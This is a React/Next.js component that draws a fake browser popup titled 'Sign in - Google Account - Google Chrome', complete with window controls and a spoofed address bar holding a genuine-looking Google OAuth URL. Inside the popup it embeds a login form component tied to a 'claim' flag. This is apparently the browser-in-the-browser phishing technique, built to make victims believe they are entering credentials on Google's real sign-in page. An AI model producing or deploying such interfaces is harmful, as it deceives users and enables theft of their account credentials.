import FormLogin from '@/components/FormLogin'
import Image from 'next/image';
import googleIcon from '@/public/google.svg'
import { VscChromeMaximize, VscChromeClose, VscChromeMinimize, VscSettings } from 'react-icons/vsc';
import { IoMdKey } from 'react-icons/io';
import { Dispatch, SetStateAction } from 'react';

type HomeType = {
  setIsClaim : Dispatch<SetStateAction<boolean>>
}

export default function Home({setIsClaim} : HomeType) {
  return <div className='max-w-[357px]'>
    <div className='bg-blue-100 flex text-black font-extralight justify-between items-center text-xs px-1 py-1'>
      <div>
        <Image alt="Google Logo" className='inline-block' priority src={googleIcon} width={20} height={20} />
        <span>Sign in - Google Account - Google Chrome</span>
      </div>
      <div className='pr-2 inline-flex w-[17%] justify-between items-center'>
        <span>
          <VscChromeMinimize />
        </span>
        <span>
          <VscChromeMaximize />
        </span>
        <span>
          <VscChromeClose />
        </span>
      </div>
    </div>
    <div className='bg-sky-100 flex text-black font-extralight justify-between items-center text-xs px-[2px] py-2'>
      <VscSettings className='w-[5%]' />
      <input type="text" defaultValue="https://accounts.google.com/v3/signin/identifier?gsiwebsdk=3&client_id=549970890748-4c56itq8mna6l1pdgvalflaic4lddotg.apps.googleusercontent.com&scope=profile%20email&redirect_uri=storagerelay%3A%2F%2Fhttps%2Fshopee.co.id%3Fid%3Dauth262997&prompt=consent&access_type=offline&response_type=code&include_granted_scopes=true&enable_granular_consent=true&service=lso&o2v=2&ddm=1&flowName=GeneralOAuthFlow&continue=https%3A%2F%2Faccounts.google.com%2Fsignin%2Foauth%2Fconsent%3Fauthuser%3Dunknown%26part%3DAJi8hAM70gAPvR6wc6guRmL7P7cHNG-I3bZ9GOS_tAsFTzvN7IahSf78sHfHOspQdRdFYwNLR30yr81Ha6FDTGZyIbmxJeTWqWlVrBrf7hLU6wy0MhgA6eF0tTn382dW1frnlsNgfkKiIsLVFDMzGnhyDyqDa0N2EeN-7AYyPclTGaXhhd5LV6IekQQGlamn-zgK_jIqFzt95xnboyoxyg4z9iVytPzXtX5Hil_P6tRXxbmkQZnW8HYQHhaz2E4CipEEYQ2X43Ik7YiyEkJz4cZEMdSzU2_9-bkCjiOeZrN5S-4XZ3mpcODtGenQj8KB4y5FF0oaBDsKtRKgstapmtVXIL2mOUP-1ei7OVixHBmD6PPazGMNktCoWq6qLuFlW9BD2fus3FpIwRKr7XFU6ou_twoPYzPXUcFrvEK2OZ4iSwPCrlRrShmDbRGCGOuJf-Ujp31w6bIR_wMBsVLRe_vC4vbVOWaMbw%26flowName%3DGeneralOAuthFlow%26as%3DS1262227698%253A1731442557482170%26client_id%3D549970890748-4c56itq8mna6l1pdgvalflaic4lddotg.apps.googleusercontent.com%23" className='outline-none bg-transparent w-[90%]'/>
      <IoMdKey className='w-[5%]'/>
    </div>
    <div className='overflow-y-auto h-[90vh] max-w-[357px]'>
    <FormLogin setIsClaim={setIsClaim}/>
    </div>
  </div>
}